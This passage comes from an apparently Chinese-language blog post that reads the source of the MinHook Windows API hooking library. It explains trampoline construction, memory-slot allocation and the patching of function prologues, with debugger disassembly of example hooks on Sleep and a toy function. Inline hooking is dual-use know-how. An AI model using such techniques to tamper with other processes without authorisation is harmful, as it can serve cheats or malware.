class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">MH_Initialize</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个 Hook</span></span><br><span class="line">    <span class="built_in">MH_CreateHook</span>(Sleep, MySleep, <span class="built_in">reinterpret_cast</span>&lt;LPVOID*&gt;(&amp;fpSleep));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启用 Hook</span></span><br><span class="line">    <span class="built_in">MH_EnableHook</span>(MH_ALL_HOOKS);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清理 Hook</span></span><br><span class="line">    <span class="built_in">MH_DisableHook</span>(MH_ALL_HOOKS);</span><br><span class="line">    <span class="built_in">MH_Uninitialize</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/62a3d636d7429cff5a7016be028cbcdb.png" alt="image-20240724165152787" /></p><h1 id="p3-代码解读"><a class="markdownIt-Anchor" href="#p3-代码解读"></a> P3. 代码解读</h1><p>这里按照Hook Sleep函数的顺序</p><h2 id="mh_initialize"><a class="markdownIt-Anchor" href="#mh_initialize"></a> MH_Initialize</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MH_STATUS WINAPI <span class="title">MH_Initialize</span><span class="params">(VOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MH_STATUS status = MH_OK;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">EnterSpinLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g_hHeap == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        g_hHeap = <span class="built_in">HeapCreate</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (g_hHeap != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Initialize the internal function buffer.</span></span><br><span class="line">            <span class="built_in">InitializeBuffer</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            status = MH_ERROR_MEMORY_ALLOC;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        status = MH_ERROR_ALREADY_INITIALIZED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LeaveSpinLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>EnterSpinLock：进入自旋锁，避免在多线程的hook中冲突。对应的是LeaveSpinLock</li><li>InitializeBuffer：无意义函数</li><li>g_hHeap：用于管理g_hooks的句柄，从之前的代码就可以看出来MinHook对于已经hook的函数的取消hook等等的管理一定是有一个全局变量在管理</li></ul><h2 id="mh_createhook"><a class="markdownIt-Anchor" href="#mh_createhook"></a> MH_CreateHook</h2><p>首先是函数的原型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MH_STATUS WINAPI <span class="title">MH_CreateHook</span><span class="params">(LPVOID pTarget, LPVOID pDetour, LPVOID *ppOriginal)</span></span></span><br></pre></td></tr></table></figure><ul><li>pTarget：待hook的函数（旧函数）</li><li>pDetour：新的函数</li><li>ppOriginal：指向旧函数的指针</li></ul><p>然后检查旧函数和新韩淑的可执行权限，这里又学到一个新的winapi <code>VirtualQuery</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//        if (IsExecutableAddress(pTarget) &amp;&amp; IsExecutableAddress(pDetour))</span></span><br><span class="line"><span class="function">BOOL <span class="title">IsExecutableAddress</span><span class="params">(LPVOID pAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MEMORY_BASIC_INFORMATION mi;</span><br><span class="line">    <span class="built_in">VirtualQuery</span>(pAddress, &amp;mi, <span class="built_in">sizeof</span>(mi));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (mi.State == MEM_COMMIT &amp;&amp; (mi.Protect &amp; PAGE_EXECUTE_FLAGS));</span><br><span class="line">&#125;            </span><br></pre></td></tr></table></figure><p>关于<code>VirtualQuery</code>函数：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualquery">https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualquery</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////////   MH_CreateHook</span></span><br><span class="line">UINT pos = <span class="built_in">FindHookEntry</span>(pTarget);</span><br><span class="line">            <span class="keyword">if</span> (pos == INVALID_HOOK_POS)</span><br><span class="line">                    </span><br><span class="line"><span class="comment">////////FindHookEntry</span></span><br><span class="line"><span class="function"><span class="type">static</span> UINT <span class="title">FindHookEntry</span><span class="params">(LPVOID pTarget)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UINT i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; g_hooks.size; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ULONG_PTR)pTarget == (ULONG_PTR)g_hooks.pItems[i].pTarget)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> INVALID_HOOK_POS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里开始就有些复杂了，上来就是两个结构体，不过不用担心，因为<code>FindHookEntry</code>中的<code>g_hooks</code>就没有初始化过，所以只能返回错误：<code>INVALID_HOOK_POS</code>，这样就进入了if里面</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////////   MH_CreateHook</span></span><br><span class="line">LPVOID pBuffer = <span class="built_in">AllocateBuffer</span>(pTarget);</span><br><span class="line">                <span class="keyword">if</span> (pBuffer != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////////   AllocateBuffer</span></span><br><span class="line"><span class="function">LPVOID <span class="title">AllocateBuffer</span><span class="params">(LPVOID pOrigin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PMEMORY_SLOT  pSlot;</span><br><span class="line">    PMEMORY_BLOCK pBlock = <span class="built_in">GetMemoryBlock</span>(pOrigin);</span><br><span class="line">    <span class="keyword">if</span> (pBlock == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove an unused slot from the list.</span></span><br><span class="line">    pSlot = pBlock-&gt;pFree;</span><br><span class="line">    pBlock-&gt;pFree = pSlot-&gt;pNext;</span><br><span class="line">    pBlock-&gt;usedCount++;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _DEBUG</span></span><br><span class="line">    <span class="comment">// Fill the slot with INT3 for debugging.</span></span><br><span class="line">    <span class="built_in">memset</span>(pSlot, <span class="number">0xCC</span>, <span class="built_in">sizeof</span>(MEMORY_SLOT));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> pSlot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///////GetMemoryBlock 节选</span></span><br><span class="line"><span class="function"><span class="type">static</span> PMEMORY_BLOCK <span class="title">GetMemoryBlock</span><span class="params">(LPVOID pOrigin)</span></span></span><br><span class="line"><span class="function">    <span class="comment">/*....*/</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span></span><br><span class="line"><span class="function">    SYSTEM_INFO si</span>;</span><br><span class="line">    <span class="built_in">GetSystemInfo</span>(&amp;si);</span><br><span class="line">    minAddr = (ULONG_PTR)si.lpMinimumApplicationAddress;</span><br><span class="line">    maxAddr = (ULONG_PTR)si.lpMaximumApplicationAddress;</span><br><span class="line">    <span class="comment">/*....*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Look the registered blocks for a reachable one.</span></span><br><span class="line">    <span class="keyword">for</span> (pBlock = g_pMemoryBlocks; pBlock != <span class="literal">NULL</span>; pBlock = pBlock-&gt;pNext)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">        <span class="comment">// Ignore the blocks too far.</span></span><br><span class="line">        <span class="keyword">if</span> ((ULONG_PTR)pBlock &lt; minAddr || (ULONG_PTR)pBlock &gt;= maxAddr)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">// The block has at least one unused slot.</span></span><br><span class="line">        <span class="keyword">if</span> (pBlock-&gt;pFree != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> pBlock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*...*/</span></span><br></pre></td></tr></table></figure><ul><li><p><code>GetSystemInfo</code>：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsysteminfo">https://learn.microsoft.com/zh-cn/windows/win32/api/sysinfoapi/nf-sysinfoapi-getsysteminfo</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lpMinimumApplicationAddress</span><br></pre></td></tr></table></figure><p>指向应用程序和动态链接库可访问的最低内存地址的指针， (DLL) 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lpMaximumApplicationAddress</span><br></pre></td></tr></table></figure><p>指向应用程序和 DLL 可访问的最高内存地址的指针。</p></li><li><p>在64位下寻找一块距离参数<code>pOrigin</code>最近的内存地址，作者这里对这种内存自行进行了管理，用的单链表（Windows的内存管理）</p></li></ul><p>接着再回到创建Hook中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pBuffer != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    TRAMPOLINE ct;</span><br><span class="line"></span><br><span class="line">    ct.pTarget     = pTarget;</span><br><span class="line">    ct.pDetour     = pDetour;</span><br><span class="line">    ct.pTrampoline = pBuffer;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">CreateTrampolineFunction</span>(&amp;ct))</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateTrampolineFunction</span><span class="params">(PTRAMPOLINE ct)</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="keyword">if</span> defined(_M_X64) || defined(__x86_64__)    </span></span></span><br><span class="line"><span class="function">    CALL_ABS call </span>= &#123;</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x15</span>, <span class="number">0x00000002</span>, <span class="comment">// FF15 00000002: CALL [RIP+8]</span></span><br><span class="line">        <span class="number">0xEB</span>, <span class="number">0x08</span>,             <span class="comment">// EB 08:         JMP +10</span></span><br><span class="line">        <span class="number">0x0000000000000000</span>ULL   <span class="comment">// Absolute destination address</span></span><br><span class="line">    &#125;;</span><br><span class="line">    JMP_ABS jmp = &#123;</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x00000000</span>, <span class="comment">// FF25 00000000: JMP [RIP+6]</span></span><br><span class="line">        <span class="number">0x0000000000000000</span>ULL   <span class="comment">// Absolute destination address</span></span><br><span class="line">    &#125;;</span><br><span class="line">    JCC_ABS jcc = &#123;</span><br><span class="line">        <span class="number">0x70</span>, <span class="number">0x0E</span>,             <span class="comment">// 7* 0E:         J** +16</span></span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x00000000</span>, <span class="comment">// FF25 00000000: JMP [RIP+6]</span></span><br><span class="line">        <span class="number">0x0000000000000000</span>ULL   <span class="comment">// Absolute destination address</span></span><br><span class="line">    &#125;;    </span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//计算汇编指令长度</span></span><br><span class="line">        copySize = <span class="built_in">HDE_DISASM</span>((LPVOID)pOldInst, &amp;hs);</span><br><span class="line">        </span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (oldPos &gt;= <span class="built_in">sizeof</span>(JMP_REL))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// The trampoline function is long enough.</span></span><br><span class="line">            <span class="comment">// Complete the function with the jump to the target function.</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">            jmp.address = pOldInst;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            jmp.operand = (UINT32)(pOldInst - (pNewInst + <span class="built_in">sizeof</span>(jmp)));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            pCopySrc = &amp;jmp;</span><br><span class="line">            copySize = <span class="built_in">sizeof</span>(jmp);</span><br><span class="line"></span><br><span class="line">            finished = TRUE;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ALLOW_INTRINSICS</span></span><br><span class="line">        <span class="built_in">memcpy</span>((LPBYTE)ct-&gt;pTrampoline + newPos, pCopySrc, copySize);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        __movsb((LPBYTE)ct-&gt;pTrampoline + newPos, (LPBYTE)pCopySrc, copySize);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        newPos += copySize;</span><br><span class="line">        oldPos += hs.len;</span><br><span class="line">    &#125; <span class="keyword">while</span> (!finished);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64) || defined(__x86_64__)</span></span><br><span class="line">    <span class="comment">// Create a relay function.</span></span><br><span class="line">    jmp.address = (ULONG_PTR)ct-&gt;pDetour;</span><br><span class="line"></span><br><span class="line">    ct-&gt;pRelay = (LPBYTE)ct-&gt;pTrampoline + newPos;</span><br><span class="line">    <span class="built_in">memcpy</span>(ct-&gt;pRelay, &amp;jmp, <span class="built_in">sizeof</span>(jmp));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br></pre></td></tr></table></figure><ul><li><code>HDE_DISASM</code>：跟进去是解析汇编指令，计算出当前函数的汇编指令长度。使用的是作者改进过的<code>Hacker Disassembler Engine 64</code>，看了下版权信息还挺古早的</li><li><code>pCopySrc</code>：如果相差很近，能使用<code>jmp</code>则使用<code>jmp</code>，根据条件得到对应的跳转指令</li><li><code>ct-&gt;pRelay</code>：存放跳转的指令</li></ul><p>这边感觉作者写的有点复杂，不过确实是好用的，解析反汇编的方法又学到一些，这里看不懂的可以看看后面的动调的解释</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////////   MH_CreateHook</span></span><br><span class="line">        PHOOK_ENTRY pHook = <span class="built_in">AddHookEntry</span>();</span><br><span class="line">        <span class="keyword">if</span> (pHook != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(pHook-&gt;oldIPs, ct.oldIPs, <span class="built_in">ARRAYSIZE</span>(ct.oldIPs));</span><br><span class="line">            <span class="built_in">memcpy</span>(pHook-&gt;newIPs, ct.newIPs, <span class="built_in">ARRAYSIZE</span>(ct.newIPs));</span><br></pre></td></tr></table></figure><p>这里就存储计算出的指令和原始汇编，便于后续启用hook的时候使用<br />这里的<code>AddHookEntry</code>的时候就已经将返回地<code>pHook</code>加入到<code>g_hook</code>中管理了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////////   MH_CreateHook</span></span><br><span class="line"><span class="keyword">if</span> (ct.patchAbove)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(</span><br><span class="line">                pHook-&gt;backup,</span><br><span class="line">                (LPBYTE)pTarget - <span class="built_in">sizeof</span>(JMP_REL),</span><br><span class="line">                <span class="built_in">sizeof</span>(JMP_REL) + <span class="built_in">sizeof</span>(JMP_REL_SHORT));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(pHook-&gt;backup, pTarget, <span class="built_in">sizeof</span>(JMP_REL));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ppOriginal != <span class="literal">NULL</span>)</span><br><span class="line">            *ppOriginal = pHook-&gt;pTrampoline;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f3362dda366faccd859c9ca71a309e89.png" alt="image-20240724181309357" /></p><p><strong>pHook-&gt;pTrampoline</strong>：这里指向的是旧的Sleep的jmp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00007FFAD228B0B0  jmp         qword ptr [7FFAD22F0A10h]  </span><br></pre></td></tr></table></figure><p>hook的时候变了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00007FFAD228B0B0  jmp         00007FFAD2260FC7</span><br></pre></td></tr></table></figure><p>但是要hook的地址不是jmp呢？这里用到最开始的hello的例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;minhook/MinHook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*myhello)</span><span class="params">()</span></span>;</span><br><span class="line">myhello lpOldHello = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;123\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">newhello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;This is New hello\n&quot;</span>;</span><br><span class="line"><span class="built_in">reinterpret_cast</span>&lt;myhello&gt;(lpOldHello)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">MH_Initialize</span>();</span><br><span class="line"><span class="built_in">MH_CreateHook</span>(hello, newhello, <span class="built_in">reinterpret_cast</span>&lt;LPVOID*&gt;(&amp;lpOldHello));</span><br><span class="line"><span class="built_in">MH_EnableHook</span>(hello);</span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="built_in">MH_DisableHook</span>(hello);</span><br><span class="line"><span class="built_in">hello</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常调用<code>hello</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00007FF7F1953E64  call        hello (07FF7F1953E10h)  </span><br><span class="line"></span><br><span class="line">void hello() &#123;</span><br><span class="line">00007FF7F1953E10  sub         rsp,28h</span><br></pre></td></tr></table></figure><p>hook过后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00007FF6D2C13E47  call        qword ptr [lpOldHello (07FF6D2C18898h)] </span><br><span class="line"></span><br><span class="line">void hello() &#123;</span><br><span class="line">00007FF7F1953E10  jmp         00007FF7F1940FD9  </span><br></pre></td></tr></table></figure><p>在hook中调用原始函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00007FF7F1953E47  call        qword ptr [lpOldHello (07FF7F1958898h)]</span><br><span class="line"></span><br><span class="line">00007FF7F1940FC0  sub         rsp,28h  </span><br><span class="line">00007FF7F1940FC4  lea         rdx,[__xmm@ffffffffffffffffffffffffffffffff+10h (07FF7F1956370h)]  </span><br><span class="line">00007FF7F1940FCB  jmp         qword ptr [7FF7F1940FD1h] </span><br><span class="line"></span><br><span class="line">00007FF7F1953E22  call        std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt; &gt; (07FF7F1953F40h) </span><br></pre></td></tr></table></figure><p>这里就已经说明的很清楚了，<strong>我们覆盖前几个字节会污染汇编指令，MinHook会把收到污染的汇编指令复制到一个地方A，A的尾部跳转到原有函数中没有收到污染的部分。</strong></p><p><strong>启用hook后修改原始函数的指针到A，这样A执行完后就会执行原函数没有污染的部分</strong></p><h2 id="mh_enablehook-enablehook"><a class="markdownIt-Anchor" href="#mh_enablehook-enablehook"></a> MH_EnableHook || EnableHook</h2><p>其实调用的是<code>EnableHook</code>，参数为true</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (g_hooks.pItems[pos].isEnabled != enable)</span><br><span class="line">&#123;</span><br><span class="line">    FROZEN_THREADS threads;</span><br><span class="line">    status = <span class="built_in">Freeze</span>(&amp;threads, pos, ACTION_ENABLE);</span><br><span class="line">    <span class="keyword">if</span> (status == MH_OK)</span><br><span class="line">    &#123;</span><br><span class="line">        status = <span class="built_in">EnableHookLL</span>(pos, enable);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Unfreeze</span>(&amp;threads);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>EnableHookLL：不管是不是启用全部hook，最终都会来到这里</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LPBYTE pPatchTarget = (LPBYTE)pHook-&gt;pTarget;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(pPatchTarget, patchSize, PAGE_EXECUTE_READWRITE, &amp;oldProtect))</span><br><span class="line">    <span class="keyword">return</span> MH_ERROR_MEMORY_PROTECT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (enable)</span><br><span class="line">&#123;</span><br><span class="line">    PJMP_REL pJmp = (PJMP_REL)pPatchTarget;</span><br><span class="line">    pJmp-&gt;opcode = <span 